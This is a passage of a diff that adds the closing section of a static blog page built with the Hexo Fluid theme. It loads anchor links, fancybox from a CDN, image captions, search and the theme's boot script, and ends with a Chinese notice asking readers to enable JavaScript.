+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
